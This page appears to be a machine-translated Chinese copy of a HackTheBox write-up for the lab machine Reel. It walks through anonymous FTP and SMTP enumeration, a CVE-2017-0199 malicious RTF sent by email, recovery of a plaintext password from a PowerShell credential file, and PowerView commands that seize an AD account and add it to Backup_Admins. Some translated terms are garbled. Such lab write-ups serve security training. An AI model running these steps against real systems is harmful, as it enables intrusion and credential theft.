<html>
<head>
<title>Reel — A BloodHound &amp; PowerSploit Active Directory HackTheBox Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Reel —一个blood hound &amp; powers loit Active Directory hack the box演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/reel-a-bloodhound-powersploit-active-directory-hackthebox-walkthrough-3745269b1a16?source=collection_archive---------0-----------------------#2018-12-05">https://infosecwriteups.com/reel-a-bloodhound-powersploit-active-directory-hackthebox-walkthrough-3745269b1a16?source=collection_archive---------0-----------------------#2018-12-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/36c51d7b50186ea7539fe5da57a09827.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*HrymiN-IuGJRKKdgF1wivg.gif"/></div></div></figure><h1 id="2d3d" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">摘要</h1><p id="cf3c" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">Reel是一个运行FTP服务的Windows主机，允许匿名访问。这被用来访问系统上的文件，以便枚举用户电子邮件并识别用户期望接收的邮件。通过电子邮件发送rtf文件。一种恶意。然后生成利用<a class="ae lu" href="https://cvedetails.com/cve/CVE-2017-0199/" rel="noopener ugc nofollow" target="_blank"> CVE的rtf文件，并通过Reel的SMTP服务器发送给用户。此漏洞允许用户访问Reel。在中发现了加密的用户凭据。xml文档并被破译以通过SSH获得持久性。</a></p><p id="6669" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">通过在主机上发现的<a class="ae lu" href="https://github.com/BloodHoundAD/Bloodhound/wiki" rel="noopener ugc nofollow" target="_blank">blood hound</a>Active Directory审计的工件，主机上的权限被升级。使用PowerView(现在是<a class="ae lu" href="https://powersploit.readthedocs.io/en/latest/" rel="noopener ugc nofollow" target="_blank"> PowerSploit </a>的一部分)利用Active Directory配置来获得对另一个用户帐户的访问权限，该用户帐户对包含管理员帐户凭证的文件具有读取权限。</p><h1 id="00c4" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">侦察</h1><p id="db78" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我开始在这台主机上进行侦察，通过<code class="fe ma mb mc md b">nmap</code>扫描检查服务版本，并在前1000个最常见的端口上运行默认脚本:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="4d8d" class="mm jz iq md b gy mn mo l mp mq">nmap -sV -sC 10.10.10.77</span></pre><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">纳米粒子加速器</figcaption></figure><p id="c600" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">这返回了3个服务:端口21上的FTP、端口22上的SSH和端口25上的SMTP。由于FTP允许匿名访问，这是枚举的下一个逻辑步骤。</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="804a" class="mm jz iq md b gy mn mo l mp mq">ftp 10.10.10.77</span></pre><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">匿名FTP</figcaption></figure><p id="6089" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">我们可以看到在<code class="fe ma mb mc md b">documents</code>文件夹中有3个我们可以访问的文件。这些文件可以使用<code class="fe ma mb mc md b">GET &lt;filename&gt;</code>命令单独复制，或者——因为这是匿名FTP——可以使用<code class="fe ma mb mc md b">wget</code>从攻击主机检索:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="ece8" class="mm jz iq md b gy mn mo l mp mq">wget -r ftp://10.10.10.77</span></pre><p id="c093" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">“Windows Event Forwarding.docx”在文档的创建者元数据字段中包含用户电子邮件地址“nico@megabank.com ”,可以使用<code class="fe ma mb mc md b">exiftool</code>查看。</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="cf45" class="mm jz iq md b gy mn mo l mp mq">exiftool “Windows Event Forwarding.docx”</span></pre><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">exiftool</figcaption></figure><p id="439d" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">文件“readme.txt”只包含:</p><blockquote class="mx my mz"><p id="7e6d" class="kw kx na ky b kz lv lb lc ld lw lf lg nb lx lj lk nc ly ln lo nd lz lr ls lt ij bi translated">“请给我发电子邮件任何rtf格式的程序，我会审查和转换。</p><p id="3300" class="kw kx na ky b kz lv lb lc ld lw lf lg nb lx lj lk nc ly ln lo nd lz lr ls lt ij bi translated">新格式/转换后的文档将保存在这里。"</p></blockquote><p id="636a" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">试图通过SMTP使用VRFY命令验证“nico@megabank.com”电子邮件帐户时，该命令被禁止。但是，RCPT命令可用于枚举有效的电子邮件帐户:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="0d1f" class="mm jz iq md b gy mn mo l mp mq">telnet 10.10.10.77 25</span></pre><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">SMTP枚举</figcaption></figure><p id="d508" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">此时，已经收集了3个关键细节:</p><ul class=""><li id="b3b6" class="ne nf iq ky b kz lv ld lw lh ng ll nh lp ni lt nj nk nl nm bi translated">主机上运行的SMTP服务器</li><li id="7972" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">电子邮件帐户“nico@megabank.com”</li><li id="83f8" class="ne nf iq ky b kz nn ld no lh np ll nq lp nr lt nj nk nl nm bi translated">有人想接收。rtf文件</li></ul><h1 id="2fb1" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">最初的立足点</h1><p id="4df1" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">研究利用迄今收集的信息的方法返回了<a class="ae lu" href="https://cvedetails.com/cve/CVE-2017-0199/" rel="noopener ugc nofollow" target="_blank">CVE-2017–0199</a>这是2017年4月发现的一个关键的微软Office零时差。这个漏洞利用了。rtf文件(有些重命名为。doc)，它将连接到远程服务器(由攻击者控制)以下载包含HTML应用程序内容的文件，并作为。hta文件。因为。hta是可执行的，攻击者就可以在受害者的机器上完全执行代码。这个逻辑错误也给了攻击者绕过微软开发的任何基于内存的缓解措施的权力(<a class="ae lu" href="https://securingtomorrow.mcafee.com/mcafee-labs/critical-office-zero-day-attacks-detected-wild/" rel="noopener ugc nofollow" target="_blank">来源</a>)。</p><p id="7e5a" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">除了Metasploit模块:“Microsoft Office Word恶意Hta执行”(exploit/windows/file format/Office _ Word _ Hta)之外，还有手动利用此漏洞<a class="ae lu" href="https://www.helpnetsecurity.com/2017/04/10/ms-office-zero-day/" rel="noopener ugc nofollow" target="_blank">的方法。需要明确的是，这两种方法都不会直接利用任何客户端。恶意文件必须在这些模块之外的受害者机器上传送和执行。这些模块会生成恶意的。rtf文件和宿主. hta文件。因为这个总结不是关于CVE-2017–0199本身，而是关于Reel的整体妥协，所以我将演示Metasploit模块，因为它更精简，更容易重复。</a></p><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">exploit/windows/file format/office _ word _ HTA</figcaption></figure><p id="fdd3" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">该模块创建了恶意文件<code class="fe ma mb mc md b">shell.rtf</code>并将其放在目录<code class="fe ma mb mc md b">/root/.msf4/local/</code>中，同时还托管了。web服务器上的hta文件。<code class="fe ma mb mc md b">swaks</code>使用瑞士军刀smtp通用SMTP事务测试器将恶意文件发送到“nico@megabank.com”:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="2b88" class="mm jz iq md b gy mn mo l mp mq">swak --to nico@megabank.com --server 10.10.10.77 --attach /root/.msf4/local/shell.rtf</span></pre><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">仪表外壳</figcaption></figure><p id="0851" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">之后不久。rtf文件被传送到主机，它被打开以产生一个回调来下载和执行。hta文件，它返回一个允许用户访问主机的meterpreter shell。</p><h1 id="164b" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">坚持</h1><p id="0def" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">用户<code class="fe ma mb mc md b">nico</code>的桌面上有一个名为<code class="fe ma mb mc md b">cred.xml</code>的文件，其中似乎包含另一个在线用户<code class="fe ma mb mc md b">tom</code>的凭证:</p><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div></figure><p id="cb6f" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">这个xml文档实现了一种存储用户凭证的方法，以便<a class="ae lu" href="https://ye110wbeard.wordpress.com/2012/05/21/three-ways-to-pass-credentials-in-a-powershell-script/" rel="noopener ugc nofollow" target="_blank">将它们传递到PowerShell脚本</a>中，而无需将凭证添加到每个脚本中。这使得更新凭证变得容易，而不会破坏多个脚本，也不需要单独更新它们。</p><p id="69bd" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">为了与xml文件进行预期的交互，meterpreter shell必须使用命令<a class="ae lu" href="https://www.darkoperator.com/blog/2016/4/2/meterpreter-new-windows-powershell-extension" rel="noopener ugc nofollow" target="_blank">加载PowerShell扩展</a>:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="901c" class="mm jz iq md b gy mn mo l mp mq">load powershell</span></pre><p id="8d41" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">使用以下命令获得了PowerShell提示符，而不是标准CMD提示符:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="6055" class="mm jz iq md b gy mn mo l mp mq">powershell_shell</span></pre><p id="aa0b" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">使用cmdlet <code class="fe ma mb mc md b">Import-CliXml</code>通过以下命令将文件作为PSCredential对象接收:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="b227" class="mm jz iq md b gy mn mo l mp mq">$tom=Import-CliXml -Path C:\Users\nico\Desktop\cred.xml</span></pre><p id="016c" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">密码是从一个系统转换来的。Security.SecureString到明文字符串，使用命令:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="0127" class="mm jz iq md b gy mn mo l mp mq">$tom.GetNetworkCredential().Password</span></pre><p id="a736" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">一起:</p><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">cred.xml明文密码</figcaption></figure><p id="f6b4" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">这个明文密码用于以用户<code class="fe ma mb mc md b">tom</code>的身份获得对Reel的SSH访问。</p><h1 id="f860" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">权限提升</h1><p id="9c16" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">在<code class="fe ma mb mc md b">tom</code>用户的桌面目录中，有一个名为“AD Audit”的文件夹，其中包含来自<a class="ae lu" href="https://github.com/BloodHoundAD/Bloodhound/wiki" rel="noopener ugc nofollow" target="_blank">blood hound</a>Active Directory审计的工件。这包括一个名为“acls.csv”的文件，其中包含每个AD用户帐户与其他用户和组的关系。</p><p id="71cb" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">查看“acls.csv”发现<code class="fe ma mb mc md b">tom</code>拥有对<code class="fe ma mb mc md b">claire</code>账户的WriteOwner权限。<code class="fe ma mb mc md b">claire</code>帐户拥有特权<code class="fe ma mb mc md b">backup_admin</code>组的写权限。官方的<a class="ae lu" href="https://powersploit.readthedocs.io/en/latest/" rel="noopener ugc nofollow" target="_blank">powers loit文档</a>以及一个重要贡献者的过时的<a class="ae lu" href="http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/" rel="noopener ugc nofollow" target="_blank">博客帖子</a>返回了正确的语法来执行密码重置并控制<code class="fe ma mb mc md b">claire</code>帐户，并将<code class="fe ma mb mc md b">claire</code>帐户添加到<code class="fe ma mb mc md b">Backup_Admins</code>组。</p><p id="7e41" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">首先，导入位于AD Audit文件夹中的<code class="fe ma mb mc md b">PowerView.ps1</code>模块:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="d5e5" class="mm jz iq md b gy mn mo l mp mq">Import-Module ‘C:\Users\tom\Desktop\AD Audit\BloodHound\PowerView.ps1’</span></pre><p id="37a6" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">接下来，<code class="fe ma mb mc md b">tom</code>拥有对<code class="fe ma mb mc md b">claire</code>用户对象的WriteOwner权限。因此将<code class="fe ma mb mc md b">tom</code>设置为<code class="fe ma mb mc md b">claire</code>对象的所有者。</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="dee3" class="mm jz iq md b gy mn mo l mp mq">Set-DomainObjectOwner -Identity claire -OwnerIdentity tom</span></pre><p id="56c4" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">既然<code class="fe ma mb mc md b">tom</code>是<code class="fe ma mb mc md b">claire</code>对象的所有者，<code class="fe ma mb mc md b">tom</code>可以向ACL添加条目。添加一个条目，赋予<code class="fe ma mb mc md b">tom</code>更改<code class="fe ma mb mc md b">claire</code>对象密码的权利。</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="3653" class="mm jz iq md b gy mn mo l mp mq">Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword</span></pre><p id="79f6" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">更改<code class="fe ma mb mc md b">claire</code>的密码:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="7e35" class="mm jz iq md b gy mn mo l mp mq">$UserPassword=ConvertTo-SecureString ‘1ts-mag1c!!!’ -AsPlainText -Force</span><span id="d1fc" class="mm jz iq md b gy ns mo l mp mq">Set-DomainUserPassword -Identity claire -AccountPassword $UserPassword</span></pre><p id="000e" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">为<code class="fe ma mb mc md b">claire</code>帐户创建一个凭证对象，以便使用<code class="fe ma mb mc md b">claire</code>的权限执行命令:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="831e" class="mm jz iq md b gy mn mo l mp mq">$Cred = New-Object System.Management.Automation.PSCredential(‘HTB\claire’, $UserPassword)</span></pre><p id="c01a" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">将<code class="fe ma mb mc md b">claire</code>添加到<code class="fe ma mb mc md b">Backup_Admins</code>组:</p><pre class="me mf mg mh gt mi md mj mk aw ml bi"><span id="82d2" class="mm jz iq md b gy mn mo l mp mq">Add-DomainGroupMember -Identity ‘Backup_Admins’ -Members ‘claire’ -Credential $Cred</span></pre><p id="f8fc" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">一起:</p><figure class="me mf mg mh gt jr"><div class="bz fp l di"><div class="mr ms l"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">拥有克莱尔</figcaption></figure><p id="f211" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">使用<code class="fe ma mb mc md b">claire</code>帐户SSH到主机，我们能够访问<code class="fe ma mb mc md b">Administrator</code>帐户的桌面，但仍然不能访问<code class="fe ma mb mc md b">root.txt</code>标志。然而，有一个“备份脚本”目录，其中包含一个名为<code class="fe ma mb mc md b">BackupScript.ps1</code>的文件，该文件包含管理员帐户的明文密码。</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/148be950a08166302b17c9f57a8a4a28.png" data-original-src="https://miro.medium.com/v2/resize:fit:1330/format:webp/1*Wj1e3BNcuBU9sVZvfQROrQ.png"/></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">管理员密码</figcaption></figure><p id="c8fd" class="pw-post-body-paragraph kw kx iq ky b kz lv lb lc ld lw lf lg lh lx lj lk ll ly ln lo lp lz lr ls lt ij bi translated">该密码用于通过SSH访问管理员帐户并获得根标志:</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nu"><img src="../Images/d1f1c1daad466b311d284cefbeff0f40.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZRx1N9qTZF-pqcdEGrQzPQ.png"/></div></div><figcaption class="mt mu gj gh gi mv mw bd b be z dk translated">证明</figcaption></figure></div></div>    
</body>
</html>